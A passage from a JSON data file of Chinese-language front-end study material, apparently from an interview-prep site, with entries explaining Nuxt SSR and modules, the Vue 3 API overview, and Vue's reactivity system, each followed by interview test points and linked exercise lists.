}}</p>\n</template>\n```\n\n**使用第三方库**\n\nNuxt与流行的状态库有多种集成方式：\n\n-   pinia\n    \n    ```css\n    npm i pinia @pinia/nuxt\n    ```\n    \n    > 如果你正在使用 npm，你可能会遇到 _ERESOLVE unable to resolve dependency tree_ 错误。如果那样的话，将以下内容添加到 `package.json` 中：\n    \n    ```json\n    \"overrides\": { \n        \"vue\": \"latest\" \n    }\n    ```\n    \n    在`nuxt.config.ts`中配置pinia。\n    \n    ```arduino\n      // Nuxt 3\n      export default defineNuxtConfig({\n          modules: ['@pinia/nuxt'],\n      })\n    \n    ```\n    \n    配置以后就可以正常使用pinia了，例如新增一个`stores/myStore.ts`文件，添加Store内容：\n    \n    ```typescript\n      import { defineStore } from \"pinia\";\n    \n      interface MyState {\n          version: string;\n      }\n    \n      export const useStore = defineStore<'myStore', MyState>('myStore', { \n          state: () => {\n              return {\n                  version: \"1.0\"\n              }\n          }\n      })\n    ```\n    \n    在组件中使用myStore：\n    \n    ```xml\n      <script setup lang=\"ts\">\n      import { useStore } from '~/stores/myStore'\n    \n      const store = useStore()\n      </script>\n    ```\n    \n\n除此之外，`Nuxt`还支持了：\n\n-   [Harlem](https://nuxt.com.cn/modules/harlem \"https://nuxt.com.cn/modules/harlem\") - 不可变的全局状态管理库\n-   [XState](https://nuxt.com.cn/modules/xstate \"https://nuxt.com.cn/modules/xstate\") - 基于状态机的方法，具有可视化和测试状态逻辑的工具\n\n## [](https://nuxt.com.cn/modules/pinia#usage \"https://nuxt.com.cn/modules/pinia#usage\")\n\n## Nuxt功能不够用？使用Module轻松扩展\n\n### 250个Module\n\n一个框架好不好用，功能丰不丰富当属核心考量方面。`Nuxt`通过`Module`机制能够轻松的扩展其功能。到目前`Nuxt`已提供**250个Module**，**800个贡献者**参与。\n\n![image.png](https://static.ecool.fun//article/5e1b06a0-0fc8-4607-8307-1b884a02810d.awebp)\n\n如果以上的模块还满足不了你的需求，那可以考虑上手写一个Module。**Nuxt的[配置](https://zh.nuxtjs.org/docs/2.x/configuration-glossary/configuration \"https://zh.nuxtjs.org/docs/2.x/configuration-glossary/configuration\")和[钩子](https://zh.nuxtjs.org/docs/2.x/concepts/nuxt-lifecycle \"https://zh.nuxtjs.org/docs/2.x/concepts/nuxt-lifecycle\")系统使得可以定制Nuxt的每个方面，并添加任何可能需要的集成（Vue插件、服务器路由、组件、日志记录等）。**\n\n### 扩展自己的Module\n\n`nuxt`命令行工具也提供了`Module`项目快速创建指令。\n\n```arduino\nnpx nuxi init -t module my-module\n```\n\n接着使用`npm run dev:prepare`为项目准备本地文件。\n\n在编写Module时，常常需要一个可运行的程序来测试，而`Nuxt`在创建module项目时默认会为你创建一个`playground`目录，其下就包含了可运行的`Nuxt`程序， 你可以在此基础上添加Module的测试代码。\n\n![image.png](https://static.ecool.fun//article/795ecebd-d521-49fd-9728-6937d59925bd.awebp)\n\nModule入口文件指定在`src/module.ts`，`Nuxt`提供了多种Module编写方式，但官方推荐使用对象编写方法，并使用`meta`属性来标识你的模块。\n\n```javascript\nimport { defineNuxtModule } from '@nuxt/kit'\n\nexport default defineNuxtModule({\n  meta: {\n    // 通常是你的模块的npm包名称\n    name: '@nuxtjs/example',\n    // `nuxt.config`中保存你的模块选项的键\n    configKey: 'sample',\n    // 兼容性约束\n    compatibility: {\n      // 支持的Nuxt版本的Semver版本\n      nuxt: '^3.0.0'\n    }\n  },\n  // 模块的默认配置选项，也可以是返回这些选项的函数\n  defaults: {},\n  // 注册Nuxt钩子的简写形式\n  hooks: {},\n  // 包含模块逻辑的函数，可以是异步的\n  setup(moduleOptions, nuxt) {\n    // ...\n  }\n})\n```\n\n`meta`为Module的元数据配置信息，核心扩展逻辑包含在`setup`函数中。`Nuxt`的Module几乎可以覆盖`Nuxt`的方方面面功能，例如组件、Composables、插件、路由、中间件等。而Module中添加相关文件需要放到`src/runtime`目录下。\n\n下图左侧为`pinia`实现的`@nuxt/pinia`模块，runtime目录下包含了`composables`和Vue相关的插件。图右侧为Vue3的水合插件 `plugin.vue3.ts`实现代码。\n\n![image.png](https://static.ecool.fun//article/db63b8f0-4e52-4f11-bb3b-14ef7f1944ae.awebp)\n\n定义了插件和composables，但如何将其添加到`Nuxt`中？参考`@nuxt/pinia`实现的module.ts核心代码， 通过`addPlugin`函数将runtime下定义的插件动态注册到`Nuxt`，通过`addImports`将`dfineStore`、`usePinia`、`storeToRefs`函数自动导入，因此在组件中使用时不需要再手动`import`。\n\n```javascript\nconst module: NuxtModule<ModuleOptions> = defineNuxtModule<ModuleOptions>({\n  ...\n  setup(options, nuxt) {\n    // configure transpilation\n    const { resolve } = createResolver(import.meta.url)\n    const runtimeDir = fileURLToPath(new URL('./runtime', import.meta.url))\n\n    // Transpile runtime\n    nuxt.options.build.transpile.push(resolve(runtimeDir))\n\n    nuxt.hook('prepare:types', ({ references }) => {\n      references.push({ types: '@pinia/nuxt' })\n    })\n\n    nuxt.hook('modules:done', () => {\n      if (isNuxtMajorVersion(2, nuxt)) {\n        addPlugin(resolve(runtimeDir, 'plugin.vue2'))\n      } else {\n        addPlugin(resolve(runtimeDir, 'plugin.vue3'))\n        addPlugin(resolve(runtimeDir, 'payload-plugin'))\n      }\n    })\n\n    addImports([\n      { from: composables, name: 'defineStore' },\n      { from: composables, name: 'acceptHMRUpdate' },\n      { from: composables, name: 'usePinia' },\n      { from: composables, name: 'storeToRefs' },\n    ])\n  },\n})\n\nexport default module\n```\n\nModule几乎可以覆盖`Nuxt`所有功能，你可以为`Nuxt`添加其支持的任何资源：\n\n-   Vue 组件\n-   Composables\n-   [Nuxt 插件](https://nuxt.com.cn/docs/guide/directory-structure/plugins \"https://nuxt.com.cn/docs/guide/directory-structure/plugins\")\n\n对于 [服务器引擎](https://nuxt.com.cn/docs/guide/concepts/server-engine \"https://nuxt.com.cn/docs/guide/concepts/server-engine\") Nitro 来说：\n\n-   API 路由\n-   中间件\n-   Nitro 插件\n\n或者任何其他你想要注入到用户的 Nuxt 应用程序中的资源：\n\n-   样式表\n-   3D 模型\n-   图片\n-   等等\n\n## 总结\n\n**`Nuxt`贯彻了`Vue`生态的一贯作风，开箱即用，学习成本低，丰富的生态社区。** 和实现客户端SPA应用类似，`Nuxt`完全复用Vue相关的常用框架，路由使用`Vue-Router`，状态管理使用`Pinia`，UI组件可直接使用`element-ui`等，因此对于习惯了Vue的开发者来说，编写`Nuxt`完全没有心智负担。\n\n**`Nuxt`的核心难点是如何保持服务端和客户端的同构性**。使用pinia创建的store，如果服务端对其进行了设置，那客户端使用时如何能够获取到设置后的值，而不是再重新初始化一次？使用`useFetch`、`useAsyncFetch`获取接口数据后，如何避免客户端重复请求？**`Nuxt`使用的方案都是通过key来标识一次请求，并将请求结果序列化到`payload`中，客户端在读取store、调用`useFetch`时，会先判断`payload`中是否存储有对应的值，有则直接使用。**\n\n一个优秀的框架少不了好的扩展生态，`Nuxt`通过`Module`机制扩展其生态，目前已支持了250个Module。`Module`支持了插件、组件、路由等各个方面的扩展，并且在工程化方面也提供了`nuxi`、[`@nuxt/module-builder`](https://nuxt.com.cn/docs/guide/going-further/modules#nuxtmodule-builder \"https://nuxt.com.cn/docs/guide/going-further/modules#nuxtmodule-builder\")、[`@nuxt/kit`](https://nuxt.com.cn/docs/guide/going-further/modules#nuxtkit \"https://nuxt.com.cn/docs/guide/going-further/modules#nuxtkit\")、[`@nuxt/test-utils`](https://nuxt.com.cn/docs/guide/going-further/modules#nuxttest-utils \"https://nuxt.com.cn/docs/guide/going-further/modules#nuxttest-utils\")等工具。",
    "testPoint": "### **1. SSR 的基础概念**\n#### **问题：**\n1. 什么是 SSR？与传统客户端渲染（CSR）有什么区别？  \n2. SSR 的优点和缺点是什么？  \n\n#### **考察点：**\n- **SSR 定义**：  \n  - 服务器端渲染是指在服务器上生成 HTML 内容并将其直接发送到浏览器，浏览器解析后呈现页面。\n  - 与 CSR 的区别是渲染过程的位置：CSR 在浏览器渲染，SSR 在服务器生成初始页面。\n\n- **优点**：\n  - 改善 SEO：搜索引擎爬虫可以抓取完整的 HTML 内容。\n  - 更快的首屏加载速度：用户可以直接看到预渲染的内容。\n  - 更好的分享体验：分享链接时能生成完整的页面快照。\n\n- **缺点**：\n  - 更高的服务器负载：每个请求都需要服务器生成页面。\n  - 更复杂的开发：需要考虑服务器和客户端的协同工作。\n  - 调试和部署复杂度增加。\n\n---\n\n### **2. Vue SSR 的核心原理**\n#### **问题：**\n1. Vue SSR 的工作流程是什么？  \n2. 为什么需要将 Vue 的组件和状态序列化到 HTML 中？  \n3. 客户端和服务器端的应用实例有何不同？  \n\n#### **考察点：**\n- **工作流程**：\n  1. 在服务器端运行 Vue 实例，根据路由生成 HTML。\n  2. HTML 包含渲染好的内容和状态，并发送到客户端。\n  3. 客户端接管页面，进行“激活”（hydration），绑定交互逻辑。\n\n- **序列化状态**：\n  - 在 SSR 中，Vue 的状态（如 Vuex 的 `state`）需要通过 `<script>` 标签嵌入到 HTML 中，供客户端使用：\n    ```html\n    <script>window.__INITIAL_STATE__ = { /* state */ }</script>\n    ```\n\n- **客户端和服务端实例的区别**：\n  - 服务端实例专注于生成 HTML，不能直接操作 DOM。\n  - 客户端实例负责挂载到已有的 DOM 上，并补充交互逻辑。\n\n---\n\n### **3. Vue SSR 的实现**\n#### **问题：**\n1. 如何使用 Vue 提供的 `@vue/server-renderer` 或 `Nuxt.js` 实现 SSR？  \n2. 服务端渲染需要哪些基本配置？  \n3. 如何处理路由和数据预取？  \n\n#### **考察点：**\n- **基本实现方式**：\n  - 使用 `@vue/server-renderer` 手动搭建 SSR：\n    ```javascript\n    import { createSSRApp } from 'vue';\n    import { renderToString } from '@vue/server-renderer';\n\n    const app = createSSRApp({\n      template: `<div>Hello, SSR!</div>`\n    });\n\n    renderToString(app).then(html => {\n      console.log(html);\n    });\n    ```\n\n  - 使用 Nuxt.js 快速搭建 SSR 项目：\n    ```bash\n    npx create-nuxt-app my-app\n    ```\n\n- **服务端渲染的配置**：\n  - 路由：基于 Vue Router，确保客户端和服务端的路由一致。\n  - 数据预取：在服务端预取数据后，将其传递到客户端。\n\n---\n\n### **4. 数据预取与同步**\n#### **问题：**\n1. SSR 如何在服务端预取数据？  \n2. 服务端获取的数据如何传递给客户端？  \n3. 如何避免客户端与服务端状态不一致？  \n\n#### **考察点：**\n- **服务端预取数据**：\n  - 使用 `asyncData` 或在路由守卫中预取数据：\n    ```javascript\n    const fetchData = async () => {\n      const data = await fetch('api/data');\n      return data.json();\n    };\n    ```\n\n- **传递状态**：\n  - 使用 `renderToString` 时，将数据注入到 HTML：\n    ```html\n    <script>window.__INITIAL_STATE__ = ${JSON.stringify(state)}</script>\n    ```\n\n- **客户端同步**：\n  - 客户端在挂载时，通过 `window.__INITIAL_STATE__` 初始化状态。\n\n---\n\n### **5. SEO 和性能优化**\n#### **问题：**\n1. Vue SSR 如何提升 SEO？  \n2. 如何提高 Vue SSR 的性能？  \n3. SSR 中如何避免重复渲染和多次数据请求？  \n\n#### **考察点：**\n- **SEO 提升**：\n  - 服务端返回的 HTML 包含完整内容，便于爬虫抓取。\n  - 配置动态 `meta` 标签（如 `title` 和 `description`）提升页面权重。\n\n- **性能优化**：\n  - 使用缓存（如 Redis）减少重复渲染。\n  - 压缩 HTML 和资源文件。\n  - 避免不必要的组件加载，使用按需加载。\n\n- **避免重复渲染**：\n  - 确保数据预取只在服务端执行，客户端通过传递的状态初始化。\n\n---\n\n### **6. 常见问题及解决方案**\n#### **问题：**\n1. SSR 项目如何处理第三方库的依赖？  \n2. 如何解决 SSR 与浏览器特性冲突（如 `window` 或 `document` 不存在）？  \n3. 什么是闪屏问题？如何解决？  \n\n#### **考察点：**\n- **第三方库问题**：\n  - 许多第三方库依赖 DOM，例如操作 `document` 或 `window`，在服务端渲染时可能会报错。\n  - 解决方案：在 `mounted` 中引入这些库，确保只在客户端运行。\n\n- **浏览器特性冲突**：\n  - 在代码中检查环境：\n    ```javascript\n    if (typeof window !== 'undefined') {\n      // 浏览器相关代码\n    }\n    ```\n\n- **闪屏问题**：\n  - 问题：服务端生成的 HTML 和客户端激活过程中样式或内容不一致。\n  - 解决方案：确保服务端和客户端使用相同的组件、路由和状态。\n\n---\n\n### **7. Nuxt.js 深入考察**\n#### **问题：**\n1. Nuxt.js 如何简化 Vue SSR 的实现？  \n2. Nuxt.js 的 `asyncData` 和 `fetch` 有什么区别？  \n3. 如何配置 Nuxt.js 的动态路由和 SEO？  \n\n#### **考察点：**\n- **简化实现**：\n  - Nuxt.js 提供开箱即用的 SSR 支持，集成了路由、数据预取和打包优化。\n\n- **`asyncData` 和 `fetch`**：\n  - `asyncData`：在组件渲染前获取数据，用于静态内容。\n  - `fetch`：在客户端和服务端均可执行，用于动态内容。\n\n- **动态路由和 SEO**：\n  - 使用动态路由文件（`pages/_id.vue`）。\n  - 在页面中定义 `head` 方法动态配置 meta 信息：\n    ```javascript\n    export default {\n      head() {\n        return {\n          title: '动态标题',\n          meta: [{ name: 'description', content: '页面描述' }]\n        };\n      }\n    };\n    ```\n\n---\n\n### **8. SSR 和静态站点生成（SSG）**\n#### **问题：**\n1. SSR 与 SSG 有什么区别？  \n2. 在什么场景下应该选择 SSR 或 SSG？  \n\n#### **考察点：**\n- **SSR**：\n  - 每次请求动态生成页面。\n  - 适用于需要实时数据的应用，如电商、动态内容。\n\n- **SSG**：\n  - 在构建时生成静态 HTML 文件，部署到 CDN。\n  - 适用于静态内容较多的应用，如博客、文档。",
    "exerciseKeyList": "[\"da682e52-a098-4f33-a4b5-9fd40bb48e99\",\"c50852c5-6471-4bd3-8392-02ab58e4c726\",\"4a0ca854-e576-4046-a740-f1ef8d4060c9\"]",
    "vipLimit": 1,
    "level": 3.5,
    "pointOrder": 1,
    "createAt": "2024-10-05T03:26:58.000Z",
    "updateAt": "2024-12-17T01:28:13.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "4a0ca854-e576-4046-a740-f1ef8d4060c9",
        "title": "SSR是什么？Vue中怎么实现？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:46:23.000Z",
        "updateAt": "2024-08-10T17:04:46.000Z"
      },
      {
        "exerciseKey": "c50852c5-6471-4bd3-8392-02ab58e4c726",
        "title": "CSR和SSR分别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T02:36:10.000Z",
        "updateAt": "2024-08-10T17:05:21.000Z"
      },
      {
        "exerciseKey": "da682e52-a098-4f33-a4b5-9fd40bb48e99",
        "title": "CSR、SSR、SSG、NSR、ESR、ISR 都是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:54:21.000Z"
      }
    ]
  },
  "85": {
    "id": 85,
    "tagId": 14,
    "title": "Vue3 API",
    "explanation": "# 📍前言\n\n最近在一次理解`vue`项目的代码时，发现周一对好多`API`都不太熟悉。这间接导致的问题是，代码理解速度要比平常要慢很多。于是乎，赶忙把`vue API`的学习提上了日程。\n\n在下面的文章中，将地板式地扫盲`vue3`文档中`API`模块的所有内容，融入周一的理解进行深入介绍。下面就来一起看看吧~🍬\n\n# 一、🖇框架搭建\n\n## 1、关于文档\n\n首先附上官方文档的具体材料：[cn.vuejs.org/api/](https://cn.vuejs.org/api/ \"https://cn.vuejs.org/api/\")\n\n## 2、VUE3 API整体盘点\n\n在`vue3`的全新`API`中，有部分在`vue2`的基础上沿用了。还有另外一部分，是`vue3`所新增加的。我们先来看`vue3 API`文档主要包含哪些内容？\n\n`vue3 API`主要包含以下六个部分：\n\n-   全局API —— 全局会用到的API\n-   组合式API —— vue3所拥有的组合式API\n-   选项式API —— vue2所拥有的选项式API\n-   内置内容 —— 指令、组件、特殊元素和特殊属性\n-   单文件组件 —— 语法定义、\n-   进阶API —— 渲染函数、服务端渲染、TS工具类型和自定义渲染\n\n![vue3 API盘点](https://static.ecool.fun//article/444fcaf8-b9b2-4d66-afa5-8f8278883fd4.)\n\n下面将依据上面提到的六大点内容，来进行相应的剖析和讲解。\n\n# 二、🎨全局API\n\nvue3的全局API包含两个部分：应用实例和通用API。那它们各自都有哪些内容呢？\n\n## 1、应用实例\n\n![02_应用实例](https://static.ecool.fun//article/f81f7b05-5cd1-4a99-8e9c-3977c245324a.)\n\n## 2、通用API\n\n![02_通用](https://static.ecool.fun//article/bdab4def-d9f6-421e-a556-a045c530fe7f.)\n\n# 三、🚲组合式API\n\n谈到`vue3` ，相信大家最为熟悉的就是 `composition API` 了，也就是 `组合式 API` 。那么，`vue3` 的 `组合式 API` 都给我们带来了什么呢？\n\n## 1、setup\n\n![01_setup](https://static.ecool.fun//article/6d08d52c-c88d-4e81-94eb-5d1dddedeca8.)\n\n## 2、响应式：核心\n\n![02_响应式核心](https://static.ecool.fun//article/f12c2f20-ba7d-4f0a-b8a0-4f06a2ccf255.)\n\n## 3、响应式：工具函数\n\n![03_响应式工具函数](https://static.ecool.fun//article/32da4564-6cb1-4306-b48b-163b7ca05526.)\n\n## 4、响应式：进阶\n\n![04_响应式进阶](https://static.ecool.fun//article/840ef52d-30d7-471b-98be-da4e69978ab7.)\n\n## 5、生命周期钩子\n\n![05_生命周期钩子](https://static.ecool.fun//article/bb6f1717-ecba-4587-8934-00e10cfc2bf6.)\n\n## 6、依赖注入\n\n![06_依赖注入](https://static.ecool.fun//article/209ae3b8-65de-43b1-b657-2044762ab57b.)\n\n# 四、🌠选项式API\n\n`选项式API` 即 `options API` 。可能有的小伙伴会觉得它在 `vue2` 项目下会更为常见一些。但在 `vue3` 项目中，也是有一些 `选项式API` 值得我们去挖掘的。那都有哪些内容呢，我们来一探究竟。\n\n## 1、状态选项\n\n![01_状态选项](https://static.ecool.fun//article/6dfc7405-11eb-4bd8-9268-e82f9304fc10.)\n\n## 2、渲染选项\n\n![02_渲染选项](https://static.ecool.fun//article/0a7d46a9-0eec-463e-90db-0b8b39331de2.)\n\n## 3、生命周期选项\n\n![03_生命周期选项](https://static.ecool.fun//article/d5440023-e856-417b-8984-828f463d6b49.)\n\n## 4、组合选项\n\n![04_组合选项](https://static.ecool.fun//article/d5793fb0-3162-466e-9194-1ffd3b308b55.)\n\n## 5、其他杂项\n\n![05_其他杂项](https://static.ecool.fun//article/86daa6a2-080d-4a5c-b8c7-925124893516.)\n\n## 6、组件实例\n\n![06_组件实例](https://static.ecool.fun//article/2afd20ff-b342-4f3e-a556-5c151f4f210f.)\n\n# 五、🏕内置内容\n\n`vue3` 的内置内容包括**指令**、**组件**、**特殊元素element**和**特殊属性attributes**。如果要谈在什么场景下会用到内置内容，那周一可能觉得，在一般的 `vue` 项目开发中，基本都会用到**内置内容**。较为常见的是用v-if和v-else-if来判断什么时候显示某个组件，什么时候不显示某个组件。\n\n还有像 `v-model` 、`v-on` 和 `v-for` 等指令，都是在 `vue` 项目中非常高频率使用的指令。那 `vue3` 的内置内容都还有哪些东西呢？请看下方介绍。\n\n## 1、指令\n\n![01_指令](https://static.ecool.fun//article/071533fa-ddff-4ed4-970c-c45a6c84795f.)\n\n## 2、组件\n\n![02_组件](https://static.ecool.fun//article/94982d71-e4cf-40f5-bc28-1045e952e25d.)\n\n## 3、特殊元素\n\n![03_特殊元素](https://static.ecool.fun//article/c0cdeaa4-b1ec-4309-8d09-2d16c88fa5b9.)\n\n## 4、特殊属性Attributes\n\n![04_特殊属性Attributes](https://static.ecool.fun//article/a5cfc116-2e63-4b07-b2ec-0e7770349f17.)\n\n# 六、📸单文件组件\n\n对于 `vue` 来说，相信大家都会非常熟悉它的组件化思想，似乎有一种理念是：万物皆可组件。那对于一个组件来说，我们都需要了解它的什么内容呢？比如，我们写的 `<template>` 是什么，用 `<script setup>` 和 `<script lang=\"ts\">` 都分别是什么含义，`<style>` 用了 `scoped` 是什么意思，`:slotted` 插槽选择器又在什么情况下使用呢？我们一起来一探究竟。\n\n## 1、SFC语法定义\n\n![01_SFC语法定义](https://static.ecool.fun//article/efb01d82-c9b4-47c3-ae8c-7370d4aaf154.)\n\n## 2、单文件组件script setup\n\n![02_单文件组setup](https://static.ecool.fun//article/db2983d0-740b-4c32-8ebe-e0304f4f2b9c.)\n\n## 3、css功能\n\n![03_CSS功能](https://static.ecool.fun//article/7c93157d-7017-4d95-94ef-cf8a9f82b451.)\n\n# 七、📈进阶API\n\n上面我们了解了 `vue3` 的基础API，准确来说，上面的 `API` 可以解决实际工作中 `80%` 的问题。那下面，我们就再来看一些较为进阶的 `api` 操作。下面所涉及到的这些 `API` ，更多的是可以在**某些定制化的场景**下，做一些高阶的操作。比如：我们可以在一个 `headless` 组件里，用 `render` 和 `h()` 函数，来渲染自定义的页面。那 `进阶 API` 都还有哪些东西呢，来看下面的内容。\n\n## 1、渲染函数\n\n![01_渲染函数](https://static.ecool.fun//article/ab2635ae-3aef-492e-bd10-c18e16159257.)\n\n## 2、服务端渲染\n\n![02_服务端渲染](https://static.ecool.fun//article/c4de063e-6326-44a7-892f-558b749ce3c4.)\n\n## 3、TypeScript工具类型\n\n![03_TypeScript工具类型](https://static.ecool.fun//article/e460ee06-6dfc-463d-a9d8-3305457557a9.)\n\n## 4、自定义渲染\n\n![04_自定义渲染](https://static.ecool.fun//article/4de66815-4a5f-4192-9db5-b2b1c571f63f.)",
    "testPoint": "### **1. Composition API**\n#### **问题：**\n1. 解释一下 Vue 3 中的 `setup()` 函数，它是什么时候被调用的？\n2. `reactive()` 和 `ref()` 的区别是什么？\n3. 如何在 Vue 3 中使用 `computed()` 和 `watch()`？\n4. `provide` 和 `inject` 在 Composition API 中如何使用？\n5. 什么是组合函数（Composables）？如何在项目中创建和使用它们？\n\n#### **考察点：**\n- **`setup()`**：Vue 3 中的核心函数，组件实例创建之前执行，用于定义响应式数据和逻辑。\n- **`reactive()`** 和 **`ref()`**：分别用于创建响应式对象和基本类型的响应式引用。\n- **`computed()`** 和 **`watch()`**：分别用于创建计算属性和观察响应式数据的变化。\n- **`provide` 和 `inject`**：用于组件间的依赖注入，`provide` 在父组件中提供值，`inject` 在子组件中获取。\n- **组合函数**：封装业务逻辑的函数，可以在多个组件中复用。\n\n---\n\n### **2. Vue 3 生命周期钩子**\n#### **问题：**\n1. Vue 3 的生命周期钩子有何变化？\n2. 如何使用 `onMounted`、`onUpdated` 和 `onUnmounted`？\n3. `beforeCreate` 和 `created` 在 Vue 3 中如何替代？\n\n#### **考察点：**\n- Vue 3 采用 Composition API 中的生命周期钩子函数，例如 `onMounted`、`onUpdated`、`onUnmounted`，取代了 Vue 2 的 `beforeCreate`、`created` 等选项。\n- 生命周期钩子函数在 `setup()` 函数中使用。\n\n---\n\n### **3. 响应式系统**\n#### **问题：**\n1. Vue 3 是如何实现响应式的？与 Vue 2 有什么区别？\n2. `reactive()` 和 `ref()` 的响应式机制有何不同？\n3. Vue 3 如何实现性能优化，特别是在响应式的性能上？\n\n#### **考察点：**\n- **Vue 3 的响应式**：使用 Proxy 替代 Vue 2 的 `Object.defineProperty`，使得响应式更加高效。\n- **响应式引用的差异**：`reactive()` 用于对象，`ref()` 用于基本数据类型。\n- **性能优化**：Vue 3 对响应式系统进行了多方面的优化，例如通过 Proxy 提高了性能，并支持懒加载和更细粒度的依赖追踪。\n\n---\n\n### **4. `Teleport` 和 `Suspense`**\n#### **问题：**\n1. `Teleport` 是什么？它有什么实际应用场景？\n2. `Suspense` 的作用是什么，如何与异步组件配合使用？\n\n#### **考察点：**\n- **`Teleport`**：允许将组件的 DOM 内容传送到 DOM 树的其他位置。常用于弹窗、模态框等 UI 元素的渲染。\n- **`Suspense`**：用于处理异步组件加载的状态，允许在组件加载时展示占位内容。\n\n---\n\n### **5. 其他新增的 Vue 3 API**\n#### **问题：**\n1. `v-model` 在 Vue 3 中有什么变化？\n2. `defineComponent` 和 `defineAsyncComponent` 有什么作用？\n3. Vue 3 中的 `emits` 配置是如何工作的？\n\n#### **考察点：**\n- **`v-model`**：Vue 3 改进了 `v-model` 的 API，支持多个 `v-model` 的使用，并且可以通过 `modelValue` 和 `update:modelValue` 自定义事件。\n- **`defineComponent`**：在 Vue 3 中，`defineComponent` 是一个类型推导函数，帮助 TypeScript 用户更好地推导组件类型。\n- **`defineAsyncComponent`**：允许定义异步组件，支持 `Suspense` 和 `loading` 插槽来处理异步加载状态。\n- **`emits`**：Vue 3 允许在组件选项中定义 `emits` 选项，用于明确声明组件可能触发的事件，有助于类型推导和更好的代码维护。\n\n---\n\n### **6. Vue Router 和 Vuex 适配**\n#### **问题：**\n1. Vue Router 4 和 Vuex 4 相比 Vue 2 版本有什么变化？\n2. 如何在 Vue 3 中配置 Vue Router，支持嵌套路由和动态路由？\n3. Vuex 4 是否和 Vue 2 版本兼容？如何在 Vue 3 中使用 Vuex 进行状态管理？\n\n#### **考察点：**\n- **Vue Router 4**：支持 Vue 3，提供更强大的路由功能，支持嵌套路由、路由守卫等功能。\n- **Vuex 4**：与 Vue 3 兼容，采用 Composition API 的方式组织状态管理，支持模块化和插件。\n\n---\n\n### **7. TypeScript 在 Vue 3 中的使用**\n#### **问题：**\n1. Vue 3 如何支持 TypeScript？\n2. Vue 3 中如何使用 `defineComponent` 来提升类型推导？\n3. Vue 3 中如何在组件中使用强类型的 `props`、`data` 和 `emits`？\n\n#### **考察点：**\n- Vue 3 提供了更好的 TypeScript 支持，`defineComponent` 可以帮助组件类型推导，`ref()` 和 `reactive()` 等 API 都支持类型推导。\n- **`props`**、**`data`** 和 **`emits`** 都可以在组件中指定类型，从而帮助静态检查和自动补全。\n\n---\n\n### **8. Composition API 与 Options API 结合使用**\n#### **问题：**\n1. 在 Vue 3 中，如何在同一个组件中结合使用 Composition API 和 Options API？\n2. 你如何在项目中决定何时使用 Composition API，何时使用 Options API？\n3. Composition API 和 Options API 在 Vue 3 中的协作如何影响组件的可维护性？\n\n#### **考察点：**\n- **协作使用**：Vue 3 支持在同一组件中同时使用 Options API 和 Composition API，可以根据业务需要灵活选择。\n- **最佳实践**：对于简单的组件，Options API 更为直观；对于复杂的逻辑，Composition API 更加灵活和可复用。\n\n---\n\n### **9. 性能优化与懒加载**\n#### **问题：**\n1. Vue 3 中有哪些性能优化特性？\n2. 如何在 Vue 3 中使用懒加载优化组件？\n3. Vue 3 如何通过 `Suspense` 和 `defineAsyncComponent` 优化异步加载组件的性能？\n\n#### **考察点：**\n- **性能优化**：Vue 3 在响应式系统、虚拟 DOM 等方面进行了优化，提升了性能。\n- **懒加载**：使用 `defineAsyncComponent` 和 `Suspense` 使得异步组件的加载更加高效，避免了在应用启动时加载所有组件。\n\n---\n\n### **10. 测试与调试**\n#### **问题：**\n1. Vue 3 中如何使用 Vue DevTools 调试组件？\n2. 如何为使用 Composition API 的 Vue 3 组件编写单元测试？\n3. Vue 3 是否有更好的错误提示和调试支持？\n\n#### **考察点：**\n- **Vue DevTools**：支持 Vue 3 的调试，可以查看组件的状态、事件和路由信息。\n- **单元测试**：对于 Vue 3 组件，可以使用 `@vue/test-utils` 进行单元测试，特别是结合 Composition API 时，测试和调试的工具更为丰富。",
    "exerciseKeyList": "[\"7b8e4d40-609a-4e52-96e0-a4515709125c\",\"3707a3b3-2330-4833-9c9b-b427887f8ee9\"]",
    "vipLimit": 1,
    "level": 4,
    "pointOrder": 1,
    "createAt": "2024-10-05T06:24:50.000Z",
    "updateAt": "2024-12-18T01:39:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "3707a3b3-2330-4833-9c9b-b427887f8ee9",
        "title": "Vue3.0 所采用的 Composition Api 与 Vue2.x 使用的 Options Api 有什么不同？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:54:22.000Z",
        "updateAt": "2024-08-10T17:04:51.000Z"
      },
      {
        "exerciseKey": "7b8e4d40-609a-4e52-96e0-a4515709125c",
        "title": "vue3 为什么要引入 Composition API ？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-06-06T01:38:47.000Z",
        "updateAt": "2024-08-10T19:06:07.000Z"
      }
    ]
  },
  "86": {
    "id": 86,
    "tagId": 14,
    "title": "响应式原理",
    "explanation": "## 什么是响应式系统\n\n在 Vue 中，数据驱动视图是一个非常重要的概念。当数据发生变化时，视图会自动更新，这是因为 Vue 实现了一个响应式系统，通过追踪依赖关系来自动更新视图。\n\n简单来说，响应式系统就是 Vue 能够监听数据变化，并在变化时自动更新 DOM 的核心机制。在 Vue3 中，响应式系统的改进使得响应式数据可以更加高效地更新视图，同时也提升了开发体验和性能。\n\n## Vue2 的响应式原理\n\n在 Vue2 中，响应式原理是通过 Object.defineProperty 来实现的。Vue 会在数据对象上定义 getter 和 setter，来实现数据变化时更新视图的功能。\n\n举个例子，当一个数据对象被定义为响应式时，我们可以通过访问这个对象的属性来触发 get 操作。具体实现如下：\n\n```js\nObject.defineProperty(obj, 'foo', {\n  get: function() {\n    console.log('get foo')\n    return obj._foo\n  },\n  set: function(newVal) {\n    console.log('set foo')\n    obj._foo = newVal\n  }\n})\n```\n\n在上面的代码中，我们通过 Object.defineProperty 方法来监听对象上的属性 foo，当访问 foo 属性时，会触发 get 操作，并输出日志。同理，当给 foo 属性赋值时，会触发 set 操作，并输出日志。\n\n在 Vue2 中，我们可以通过使用上面的方法来将数据对象中的所有属性转化成响应式的，以实现数据变化时更新视图的功能。\n\n## Vue3 的响应式原理\n\n在 Vue3 中，响应式原理的实现方式和 Vue2 相比，有了相当大的变化。Vue3 直接使用了 ES6 Proxy 对象来拦截对对象的访问操作。Proxy 可以监听到对对象进行的访问、赋值等操作，并在这些操作发生时通知相关依赖以维护响应式系统的更新。\n\n具体来说，当我们将一个数据对象定义为 reactive 对象时，Vue3 将在这个对象上建立一个 Proxy，这个 Proxy 